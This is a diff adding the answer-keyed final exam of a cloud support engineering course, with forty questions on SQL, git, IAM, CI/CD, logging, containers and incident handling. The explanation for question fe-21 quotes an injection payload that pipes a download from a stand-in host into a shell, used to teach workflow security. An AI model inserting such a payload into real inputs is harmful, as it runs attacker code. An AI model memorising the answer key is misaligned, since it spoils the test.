@@ -1,0 +1,540 @@
+{
+  "id": "final-exam",
+  "title": "Final Exam: Cloud Support Engineering",
+  "description": "Forty questions drawn from all six chapters, weighted towards diagnosis and judgement rather than recall. 60 minutes, 75% to pass. Best taken after finishing every chapter.",
+  "passingScore": 75,
+  "shuffle": true,
+  "timeLimitMinutes": 60,
+  "questions": [
+    {
+      "id": "fe-01",
+      "type": "single",
+      "prompt": "Which is valid, deterministic T-SQL for the twenty most expensive orders?",
+      "options": [
+        "SELECT * FROM Orders ORDER BY TotalDue DESC LIMIT 20",
+        "SELECT TOP (20) * FROM Orders",
+        "SELECT TOP (20) * FROM Orders ORDER BY TotalDue DESC",
+        "SELECT * FROM Orders FETCH FIRST 20 ROWS"
+      ],
+      "answer": 2,
+      "explanation": "LIMIT is not T-SQL. TOP without ORDER BY returns arbitrary rows. OFFSET…FETCH is valid but requires an ORDER BY and an OFFSET clause."
+    },
+    {
+      "id": "fe-02",
+      "type": "single",
+      "prompt": "Moving a condition on the outer table from WHERE into the ON clause of a LEFT JOIN has what effect?",
+      "options": [
+        "None — the two are equivalent",
+        "It preserves unmatched left-hand rows instead of filtering them out",
+        "It converts the join to an INNER JOIN",
+        "It causes a syntax error"
+      ],
+      "answer": 1,
+      "explanation": "In an outer join, conditions in ON participate in matching; conditions in WHERE filter after the join and eliminate the NULL-extended rows. For inner joins the two are equivalent — that is the discriminator.",
+      "points": 2
+    },
+    {
+      "id": "fe-03",
+      "type": "single",
+      "prompt": "A SUM over a join returns four times the expected value. What is the most likely cause?",
+      "options": [
+        "Integer overflow",
+        "Fan-out — a one-to-many join duplicating the parent row once per child",
+        "NULL values being counted as zero",
+        "A missing index"
+      ],
+      "answer": 1,
+      "explanation": "Joining an order to its four line items repeats the order's total four times. Diagnose by running the query without the aggregate and checking the row count; fix by aggregating the child first, or by summing the correct column."
+    },
+    {
+      "id": "fe-04",
+      "type": "single",
+      "prompt": "Which predicate can use an index seek?",
+      "options": [
+        "WHERE LEFT(AccountNumber, 3) = 'AW0'",
+        "WHERE AccountNumber LIKE 'AW0%'",
+        "WHERE YEAR(OrderDate) = 2013",
+        "WHERE CAST(CustomerId AS VARCHAR) = '29825'"
+      ],
+      "answer": 1,
+      "explanation": "A trailing wildcard preserves the sort order so the engine can seek to the range. Wrapping the column in LEFT(), YEAR() or CAST() forces evaluation per row and destroys SARGability.",
+      "points": 2
+    },
+    {
+      "id": "fe-05",
+      "type": "single",
+      "prompt": "What is a key lookup, and why does it matter?",
+      "options": [
+        "A hash of the primary key; it speeds up joins",
+        "Fetching remaining columns from the clustered index after a non-clustered seek — too many make the optimiser prefer a scan",
+        "A lock taken on the primary key during an update",
+        "The first operator in every execution plan"
+      ],
+      "answer": 1,
+      "explanation": "If the engine estimates 200,000 lookups, it will decide scanning is cheaper — and it is usually right. Adding the needed columns as INCLUDE makes the index covering and removes the lookup.",
+      "points": 2
+    },
+    {
+      "id": "fe-06",
+      "type": "single",
+      "prompt": "When is `git reset --hard` the wrong tool?",
+      "options": [
+        "On local commits you have not pushed",
+        "On any branch that has been pushed and pulled by others",
+        "On a detached HEAD",
+        "Immediately after a commit"
+      ],
+      "answer": 1,
+      "explanation": "Reset rewrites history. For anything already public, use git revert, which adds a new commit inverting the change. Reset plus force-push on a shared branch is the classic way to destroy a colleague's afternoon."
+    },
+    {
+      "id": "fe-07",
+      "type": "single",
+      "prompt": "Why does squash-merging pull requests make `git bisect` more useful?",
+      "options": [
+        "It reduces the repository size",
+        "Every commit on main is a complete, buildable change, so every bisect step is testable",
+        "Bisect only works on squashed commits",
+        "It halves the number of commits to search"
+      ],
+      "answer": 1,
+      "explanation": "With WIP commits on main, bisect repeatedly lands on commits that do not build and you have to skip your way through. One coherent commit per change makes every step meaningful."
+    },
+    {
+      "id": "fe-08",
+      "type": "multi",
+      "prompt": "Which practices belong in a support-grade Python script? Select all that apply.",
+      "options": [
+        "Pass an explicit timeout to every HTTP call",
+        "Stream large files rather than reading them fully into memory",
+        "Return a non-zero exit code on failure and write errors to stderr",
+        "Build SQL by f-string formatting the user's input"
+      ],
+      "answer": [0, 1, 2],
+      "explanation": "The last is a SQL injection vector even in an internal script, and it defeats plan reuse. Use parameter placeholders.",
+      "points": 2
+    },
+    {
+      "id": "fe-09",
+      "type": "single",
+      "prompt": "A log parser reports zero errors. What number should you check before believing it?",
+      "options": [
+        "Total file size",
+        "The count of lines it failed to parse",
+        "The script's runtime",
+        "The number of unique timestamps"
+      ],
+      "answer": 1,
+      "explanation": "A parser silently skipping 40% of lines will confidently report that everything is fine. Unparsed-line count is the first number to look at in anyone's log-analysis output."
+    },
+    {
+      "id": "fe-10",
+      "type": "single",
+      "prompt": "What does `additionalProperties: false` do to your ability to evolve an API?",
+      "options": [
+        "Nothing — it only affects validation performance",
+        "It makes adding a new field a breaking change for strict consumers, while catching typos in field names",
+        "It permits any extra field",
+        "It makes all properties required"
+      ],
+      "answer": 1,
+      "explanation": "The usual compromise is strict on the way in — so callers get told about typos like 'emial' — and permissive on the way out, so you can add response fields without a coordinated release."
+    },
+    {
+      "id": "fe-11",
+      "type": "single",
+      "prompt": "Why store monetary amounts as integers in minor units?",
+      "options": [
+        "Integers sort faster",
+        "Floating point cannot represent values like 0.10 exactly, producing rounding bugs",
+        "JSON does not support decimals",
+        "It halves storage"
+      ],
+      "answer": 1,
+      "explanation": "Financial rounding discrepancies are a support nightmare to reconcile, and storing pence as an integer removes the entire class of problem."
+    },
+    {
+      "id": "fe-12",
+      "type": "matching",
+      "prompt": "Match each service model to the first thing you would investigate for a failure.",
+      "pairs": [
+        { "left": "IaaS", "right": "Guest OS state — disks, patches, whether the service restarted" },
+        { "left": "PaaS", "right": "Application code, configuration and platform quotas — usually with no shell available" },
+        { "left": "SaaS", "right": "Configuration, permissions and integration payloads; escalate with evidence if the product itself is broken" }
+      ],
+      "explanation": "Data is yours in every model — including whether the backups actually restore. That is the sentence interviewers remember.",
+      "points": 2
+    },
+    {
+      "id": "fe-13",
+      "type": "single",
+      "prompt": "Two AZs versus two regions — what is the difference in what they protect against?",
+      "options": [
+        "None; the terms are interchangeable",
+        "Multi-AZ protects against a data centre failure within a region; multi-region protects against losing an entire region",
+        "Multi-AZ is for latency, multi-region is for cost",
+        "Multi-AZ requires a NAT gateway"
+      ],
+      "answer": 1,
+      "explanation": "Multi-AZ is high availability, measured by uptime. Multi-region is disaster recovery, measured by RTO and RPO. Deploying across two AZs is the cheapest resilience improvement available."
+    },
+    {
+      "id": "fe-14",
+      "type": "single",
+      "prompt": "Which is an explicit customer responsibility under the shared responsibility model, regardless of service type?",
+      "options": [
+        "Hypervisor patching",
+        "Physical data centre security",
+        "Your data, its classification and its backups",
+        "Network cabling"
+      ],
+      "answer": 2,
+      "explanation": "There is no service model in which the provider is responsible for your data being correct, backed up in a way you have tested, or not accidentally made public."
+    },
+    {
+      "id": "fe-15",
+      "type": "single",
+      "prompt": "IAM policy evaluation: which statement is correct?",
+      "options": [
+        "An explicit Allow overrides an explicit Deny",
+        "An explicit Deny always wins, and the default with no matching statement is deny",
+        "The most recently attached policy wins",
+        "Resource policies always override identity policies"
+      ],
+      "answer": 1,
+      "explanation": "Default deny, explicit deny always wins, and guardrails — SCPs and permissions boundaries — can only restrict, never grant. That is why AdministratorAccess can still produce AccessDenied.",
+      "points": 2
+    },
+    {
+      "id": "fe-16",
+      "type": "single",
+      "prompt": "A Lambda's REPORT line shows an `Init Duration` value. What does that tell you?",
+      "options": [
+        "The function timed out",
+        "This invocation was a cold start",
+        "The function was throttled",
+        "Memory was exhausted"
+      ],
+      "answer": 1,
+      "explanation": "Init Duration only appears when a new execution environment was created. Its absence means the environment was warm. Max Memory Used near Memory Size is the separate signal for an approaching OOM."
+    },
+    {
+      "id": "fe-17",
+      "type": "boolean",
+      "prompt": "Asynchronous Lambda invocations retry on failure, so handlers must be idempotent.",
+      "answer": true,
+      "explanation": "Async invocations from S3, SNS or EventBridge retry twice by default. A handler that charges a card and then fails while writing the receipt can charge three times."
+    },
+    {
+      "id": "fe-18",
+      "type": "ordering",
+      "prompt": "Put the CI pipeline stages in the order that gives fastest feedback on the cheapest failures.",
+      "items": [
+        "Integration tests against real dependencies",
+        "Lint and type check",
+        "Unit tests",
+        "Deploy to staging",
+        "Build the artifact"
+      ],
+      "answer": [
+        "Lint and type check",
+        "Unit tests",
+        "Build the artifact",
+        "Deploy to staging",
+        "Integration tests against real dependencies"
+      ],
+      "explanation": "Fail fast, then increasing fidelity. A lint error should fail in forty seconds, not after a twenty-minute integration suite.",
+      "points": 3
+    },
+    {
+      "id": "fe-19",
+      "type": "single",
+      "prompt": "Which requirement follows directly from 'build once, promote everywhere'?",
+      "options": [
+        "Every environment needs its own registry",
+        "Configuration must live outside the artifact, supplied at run time",
+        "Tests must run in production",
+        "Artifacts must be rebuilt nightly"
+      ],
+      "answer": 1,
+      "explanation": "If the build bakes in a connection string, the same image cannot run in three environments and you cannot promote. Configuration goes in environment variables, mounted files, or a secrets manager."
+    },
+    {
+      "id": "fe-20",
+      "type": "single",
+      "prompt": "What is the practical difference between deployment and release?",
+      "options": [
+        "They are synonyms",
+        "Deployment puts code on servers; release exposes behaviour to users. Feature flags separate them",
+        "Release happens first, then deployment",
+        "Deployment applies only to containers"
+      ],
+      "answer": 1,
+      "explanation": "Separating them is what allows continuous deployment in an organisation that still wants control over when customers see something new. Making this distinction out loud is a strong interview signal."
+    },
+    {
+      "id": "fe-21",
+      "type": "single",
+      "prompt": "In a GitHub Actions workflow, why is interpolating `${{ github.event.pull_request.title }}` directly into a `run:` block dangerous?",
+      "options": [
+        "Titles can be very long",
+        "The title is untrusted input and is substituted before the shell parses the line, so it can inject commands",
+        "It exposes the repository name",
+        "It breaks YAML parsing"
+      ],
+      "answer": 1,
+      "explanation": "A PR title of `; curl evil.sh | sh #` becomes shell. Pass it via an env: block instead, where it is never parsed as shell.",
+      "points": 2
+    },
+    {
+      "id": "fe-22",
+      "type": "single",
+      "prompt": "Which log level should a retry that eventually succeeded be recorded at?",
+      "options": ["DEBUG", "INFO", "WARNING", "ERROR"],
+      "answer": 2,
+      "explanation": "Something unexpected happened but was handled — that is WARNING. ERROR should mean a user-visible operation failed, so that your ERROR count is a metric worth alerting on."
+    },
+    {
+      "id": "fe-23",
+      "type": "single",
+      "prompt": "Why should a log event's `message` be a stable snake_case name like `payment_failed` rather than a sentence?",
+      "options": [
+        "It saves storage",
+        "Filters, dashboards and alerts built on the name keep working when the human-readable wording changes",
+        "JSON does not permit spaces in strings",
+        "It is required by CloudWatch"
+      ],
+      "answer": 1,
+      "explanation": "Values go in fields; the message is an identifier. Changing one is a breaking change to every dashboard built on it — treat it like renaming a database column."
+    },
+    {
+      "id": "fe-24",
+      "type": "single",
+      "prompt": "A customer complains of slowness while your latency dashboard looks fine. What are you most likely looking at?",
+      "options": [
+        "Log retention that is too short",
+        "An average that hides a bad tail — you need p95 or p99",
+        "A missing correlation ID",
+        "Insufficient metric dimensions"
+      ],
+      "answer": 1,
+      "explanation": "A service with a 120 ms mean and a 14-second p99 is failing badly for one request in a hundred, and the mean will never show it."
+    },
+    {
+      "id": "fe-25",
+      "type": "single",
+      "prompt": "What does OpenTelemetry give you that a vendor's own SDK does not?",
+      "options": [
+        "Lower latency",
+        "Vendor-neutral instrumentation — change backend by changing configuration, not code",
+        "Automatic alerting",
+        "Free data storage"
+      ],
+      "answer": 1,
+      "explanation": "Before OTel, changing observability vendor meant re-instrumenting every service. Instrument once and export to CloudWatch, Application Insights, Jaeger, Datadog or Grafana Tempo by configuration."
+    },
+    {
+      "id": "fe-26",
+      "type": "single",
+      "prompt": "Which alarm would detect an upstream system silently stopping?",
+      "options": [
+        "Error rate above 5%",
+        "p99 latency above 3 seconds",
+        "Invocations equal to zero for 30 minutes during business hours",
+        "Memory above 80%"
+      ],
+      "answer": 2,
+      "explanation": "If nothing arrives, nothing fails — error rate, latency and saturation alarms are all structurally blind to silence. A low-traffic alarm is the most under-configured and most valuable of the four.",
+      "points": 2
+    },
+    {
+      "id": "fe-27",
+      "type": "single",
+      "prompt": "In Azure, what determines whether a role assignment applies to a resource?",
+      "options": [
+        "The resource's tags",
+        "The scope it was assigned at — assignments inherit downward through the hierarchy",
+        "The order of assignment",
+        "Whether the resource is in the same region"
+      ],
+      "answer": 1,
+      "explanation": "Azure RBAC assigns at a scope — management group, subscription, resource group or resource — and inherits downward. Assign at the narrowest scope that works."
+    },
+    {
+      "id": "fe-28",
+      "type": "single",
+      "prompt": "Why can an Azure **Contributor** not grant someone else access?",
+      "options": [
+        "A licensing restriction",
+        "By design, 'change things' is separated from 'change who can change things'",
+        "Contributor is read-only",
+        "Only Global Administrators can grant Azure access"
+      ],
+      "answer": 1,
+      "explanation": "A Contributor can delete your database but cannot give a colleague permission to read it. Separating those two powers is a well-designed default worth understanding as a principle."
+    },
+    {
+      "id": "fe-29",
+      "type": "single",
+      "prompt": "Client secret expiry causes outages with error 7000215. What is the best remedy?",
+      "options": [
+        "Set a longer expiry",
+        "Use a managed identity, or workload identity federation for external CI — so no secret exists",
+        "Store the secret in two places",
+        "Disable secret expiry entirely"
+      ],
+      "answer": 1,
+      "explanation": "In order of preference: managed identity, workload identity federation, certificate credentials, then client secrets with a calendar reminder. An expiring secret nobody tracked is one of the most common self-inflicted outages in Microsoft estates.",
+      "points": 2
+    },
+    {
+      "id": "fe-30",
+      "type": "fill-blank",
+      "prompt": "Complete the two identity concepts.",
+      "text": "{{0}} answers 'who are you?'; {{1}} answers 'what may you do?'",
+      "blanks": [
+        ["authentication", "authn"],
+        ["authorisation", "authorization", "authz"]
+      ],
+      "explanation": "Entra ID handles authentication and issues the token; Azure RBAC and application logic handle authorisation. Conflating them is the root of many access-related tickets.",
+      "points": 2
+    },
+    {
+      "id": "fe-31",
+      "type": "single",
+      "prompt": "Why do Azure **resource logs** frequently turn out not to exist when you need them?",
+      "options": [
+        "They expire after 24 hours",
+        "They require a diagnostic setting per resource, which is off by default",
+        "They are only available on Premium tiers",
+        "KQL cannot query them"
+      ],
+      "answer": 1,
+      "explanation": "Metrics flow automatically; resource logs do not. Use an Azure Policy with DeployIfNotExists to apply diagnostic settings automatically to new resources — that is the answer to 'how do we make sure this never happens again?'",
+      "points": 2
+    },
+    {
+      "id": "fe-32",
+      "type": "single",
+      "prompt": "Why should the liveness probe not check the database?",
+      "options": [
+        "Database checks are slow",
+        "A database outage would then restart every container, adding a crash loop to an existing outage",
+        "Liveness probes cannot make network calls",
+        "It would double the connection count"
+      ],
+      "answer": 1,
+      "explanation": "Liveness answers 'is this process wedged?' and failure means restart. Readiness answers 'can I serve traffic?' and failure only removes the instance from load balancing. Dependencies belong in readiness.",
+      "points": 2
+    },
+    {
+      "id": "fe-33",
+      "type": "single",
+      "prompt": "Why should production never deploy the `:latest` image tag?",
+      "options": [
+        "It downloads more slowly",
+        "It is a mutable pointer — you cannot tell what is running, rollback is meaningless, and nodes pulling at different times can differ",
+        "Registries charge extra for it",
+        "It disables image scanning"
+      ],
+      "answer": 1,
+      "explanation": "Deploy the commit SHA tag. Combined with immutable tags in the registry, that makes 'build once, promote' structurally enforced."
+    },
+    {
+      "id": "fe-34",
+      "type": "single",
+      "prompt": "Your container has produced no logs for several minutes, then was killed and the logs were lost. What is the most likely cause?",
+      "options": [
+        "The log driver is misconfigured",
+        "Python is buffering stdout — PYTHONUNBUFFERED is not set",
+        "The disk is full",
+        "The log level is set to ERROR"
+      ],
+      "answer": 1,
+      "explanation": "Python buffers stdout in blocks, so a low-traffic service can emit nothing for minutes, and a kill loses the buffer. The logs you most need are the ones just before a crash."
+    },
+    {
+      "id": "fe-35",
+      "type": "single",
+      "prompt": "A customer reports failures. Error counts show 1,200 failures across 3 distinct customers. What does that indicate?",
+      "options": [
+        "A platform-wide outage requiring immediate escalation",
+        "A concentrated integration or configuration problem — a support ticket, not an incident",
+        "A database failure",
+        "Insufficient monitoring"
+      ],
+      "answer": 1,
+      "explanation": "Blast radius is what distinguishes a ticket from an incident. Concentrated failures point at a contract or configuration issue on specific integrations; widespread failures point at something systemic.",
+      "points": 2
+    },
+    {
+      "id": "fe-36",
+      "type": "single",
+      "prompt": "Error rate rose at 14:20; a deploy went out at 14:18. What should you do next?",
+      "options": [
+        "Read the diff to understand exactly what broke",
+        "Capture one correlation ID for the investigation, then roll back",
+        "Wait ten minutes to see whether it recovers",
+        "Increase the instance count"
+      ],
+      "answer": 1,
+      "explanation": "Mitigate before diagnosing. Capturing a correlation ID preserves the trail; rollback takes two minutes and the logs will still be there tomorrow. Understanding the bug while customers fail is the wrong order.",
+      "points": 2
+    },
+    {
+      "id": "fe-37",
+      "type": "single",
+      "prompt": "Which post-mortem action item is most likely to prevent recurrence?",
+      "options": [
+        "Remind the team to review schema changes carefully",
+        "Add a CI check that fails when a schema change narrows an enum or adds a required field",
+        "Add the incident to a quarterly review deck",
+        "Increase the on-call rota size"
+      ],
+      "answer": 1,
+      "explanation": "Individual vigilance does not scale and does not survive a bad night. Systemic controls do. Blamelessness is a practical technique: assume people acted reasonably given what they knew, and ask what the system should have shown them.",
+      "points": 2
+    },
+    {
+      "id": "fe-38",
+      "type": "multi",
+      "prompt": "Which belong in a runbook written for 2am? Select all that apply.",
+      "options": [
+        "Copy-pasteable commands, not descriptions",
+        "A decision tree keyed on the dominant error code",
+        "The full system architecture and design rationale",
+        "Explicit escalation criteria with a time bound"
+      ],
+      "answer": [0, 1, 3],
+      "explanation": "Architecture and rationale belong in the README and ADRs. A runbook is for a tired stranger who wants to restore service and go back to bed — mitigation before diagnosis, commands not prose.",
+      "points": 2
+    },
+    {
+      "id": "fe-39",
+      "type": "single",
+      "prompt": "A duplicate ticketId returns 200 rather than 409. What is the strongest justification?",
+      "options": [
+        "409 is not a real status code",
+        "The caller's intent — that this ticket should exist — is satisfied, so it is not an error, and it makes retry-safe advice possible",
+        "200 responses are cached by proxies",
+        "409 would break the JSON Schema"
+      ],
+      "answer": 1,
+      "explanation": "409 is also defensible and forces explicit handling. What matters is that you picked one, documented it, and can explain why — and that returning 200 is what makes 'retry with the same ticketId' safe advice on a 503."
+    },
+    {
+      "id": "fe-40",
+      "type": "single",
+      "prompt": "Which statement best demonstrates operational instinct in an interview?",
+      "options": [
+        "I am familiar with CloudWatch, Application Insights and Grafana",
+        "I built a service, wrote a runbook for it, then deliberately broke it in production, followed my own runbook, and fixed the three steps that were wrong",
+        "I hold both AWS and Azure certifications",
+        "I have read the Google SRE book"
+      ],
+      "answer": 1,
+      "explanation": "It demonstrates the instinct rather than claiming it, and it is a direct answer to 'how would you handle being on call?' Almost nobody does this, which is exactly why it is memorable.",
+      "points": 3
+    }
+  ]
+}
